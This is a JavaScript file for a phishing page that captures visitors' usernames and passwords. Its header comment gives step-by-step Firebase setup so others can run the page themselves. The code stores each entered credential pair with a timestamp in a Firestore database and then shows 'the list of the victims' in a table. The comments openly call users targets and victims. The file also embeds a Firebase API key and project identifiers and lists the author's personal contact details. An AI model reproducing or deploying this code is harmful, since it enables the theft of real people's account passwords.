/*

>>>SORRY I SHUT DOWN THE DATABASE<<<

  To use this site for you own you can follow these steps-


  #1.Create a Firebase account
  To create a firebase account you can simply visit
  https://firebase.google.com
  then click on the "Get Start" button.
  It will ask you to login with google.
  Complete your login using your google account.
  
  
  #2.Create a firebase project
  After successfully login you'll see a "Create a project" button.
  Simply click on that.
  Then it will ask for a name of the project.
  Give a name and check the "I accept Firebase terms" checkbox.
  Click on "continue".
  Then you can enable or disable the "Enable Google Analytics for this project" button.It doesn't matter.But I recommend to disable this.
  Then click on "continue" again.
  It will take some time.
  If it is complete then just click on "continue" button.
  It'll take you to the firebase console.
  
  
  #3.Create a Firebase Web App
  After creating a project you need a web app.
  In the firebase console you will see some buttons bellow your project name something like "IOS","Android","< / >","Unity".
  As I said before, we need a web app. And "< / >" is the symbol for web app. Just click on that.
  It will ask for app nickname. Fill it with whatever you want to call your app.
  [Don't check the "Also setup firebase hosting for this app" as we don't need it here.]
  Click on "Register app" button.
  It will generate some code. It is the SDK.
  You'll see a variable something like 
     var firebaseConfig = {
      ...
       }
 Copy the variable or the value from there and replace the variable in this project.It is placed right after this comment.It is the most important part as it connect firebase with our code or project or app whatever you call.
 Then click on "Continue to console" button.
 
 
 #4.Create a Cloud Firestore Database
 To create a database,you have to open the sidebar in the console by clicking the hamburger or three dash icon on the top left. (For Small Size screen.eg: Mobile) or click on ">" icon from the minimized sidebar(For large screen.eg:pc).
 From the sidebar, click on "Build" and then click on "Cloud Firestore".
 Now click on "Create Database" and then click "start in test mode".
 Then click on "Next" (In small screen device you may have to scroll a bit for the button).
 Then select the region that you think will be good for your app. This is tha location of data center where google will store your data.So shorter distance from the data center means faster speed for data transfer.
 The clcik on enable.
 It will take some time to create your database.
 Once it is ready, we are ready to go!
 Now enjoy and play around with it!✌️
 
 
 
 If any problem then contact me:
   #Facebook:  https://facebook.com/TajulTonim
   #Instagram: https://instagram.com/TajulTonim
   #Email:     mail@tajultonim.ml
   #WhatsApp:  +8801878613436
  
  For more contact info, visit-
      https://tajultonim.ml/contact
  

  
 
  
This is the variable you have to change:*/
  
 var firebaseConfig = {
    apiKey: "AIzaSyBJTQc615QmV9G3t0y7O6jltIiag7Fq0iY",
    authDomain: "testk-86f99.firebaseapp.com",
    projectId: "testk-86f99",
    storageBucket: "testk-86f99.appspot.com",
    messagingSenderId: "1021114647150",
    appId: "1:1021114647150:web:ba40c5418ab6feac805c7f"
  };

//Initializing firebase and declaring the database:
firebase.initializeApp(firebaseConfig);
const db=firebase.firestore();

//This is the function that will add target's data on the database:
function addData() {
     //Getting target's input value:
     var user = document.getElementById("nameField").value;
     var password = document.getElementById("passField").value;                              
      //Checking if target entered values properly
      if(user == ""){
          document.getElementById("nam").style.borderColor="red";
          document.getElementById("nameField").focus(); 
        }else if(password == ""||password.length<6){
          document.getElementById("pas").style.borderColor="red";
          document.getElementById("passField").focus();
        }else{
          //If he entered both of the value and password is more than 6 character long then it will add data:
          db.collection("Users").doc(user).set({
            "User":user,
            "Password":password,
            "Time":firebase.firestore.FieldValue.serverTimestamp()  
          }).then(()=>{
           //Hiding the form and showing a message if data successfully added to the database:
            document.getElementById("fscreen").style.display="none";
            document.getElementById("sucsm").style.display="inherit";
            //Waiting 2 second before showing data
            setTimeout(
              function (){
                //Hiding everything and calling the function to showing a list of the victims
                document.getElementById("all").style.display="none";
                document.getElementById("userList").style.display="table";
                getUsers();
                return false;
              },2000)   
            }).catch((error)=>{
              //Log the error message if there is a error
              console.log(error.message)
          })
      }                     
 }
 

//This is the function that will show the list of the victims
 function getUsers(){
  //Getting all the users
   db.collection("Users").orderBy("Time","desc").get().then((users)=>{
     var index=0;
     //Adding all the users to the table
     users.forEach((user)=>{
       index++;
       var data=user.data();
       var user=data.User;
       var pass=data.Password;
       var timestamp=data.Time.toDate();
       var date=timestamp.getDate()+"-"+(parseInt(timestamp.getMonth())+1)+"-"+timestamp.getFullYear();
       var time=timestamp.getHours()+":"+timestamp.getMinutes()+":"+timestamp.getSeconds();    
       document.getElementById("userList").innerHTML+="<tr><td>"+index+"</td><td>"+user+"</td><td>"+pass+"</td><td>"+time+"</td><td>"+date+"</td></tr>"
     })
   })
 }


//This will change the password fields border color to default as it will turn into red if there is an error
document.getElementById("passField").onclick=function(){
  if(document.getElementById("pas").style.borderColor=="red"){
    document.getElementById("pas").style.borderColor="inherit";

  }
  else{
    document.getElementById("pas").style.borderColor="inherit";

  }
}
////This will change the name fields border color to default as it will turn into red if there is an error
 document.getElementById("nameField").onclick=function(){
  if(document.getElementById("nam").style.borderColor=="red"){
    document.getElementById("nam").style.borderColor="inherit";

  }
  else{
    document.getElementById("nam").style.borderColor="inherit";

  }
}

//This will check that if there is any value in the password field.If there is any value then it will show to password show or hide button
var t=setInterval(
  function (){
    if(document.getElementById("passField").value.length==0){
      document.getElementById("snh").style.display="none";
    }
    else{
     document.getElementById("snh").style.display="flex";
    }
  }
)

//This is the function that will change the inout type for the password field to show or hide the password
function snhf() {
  var x = document.getElementById("passField");
  if (x.type === "password") {
    x.type = "text";
    document.getElementById("snh").innerHTML="<p>HIDE</p>";
  } else {
    x.type = "password";
    document.getElementById("snh").innerHTML="<p>SHOW</p>";
  }
}
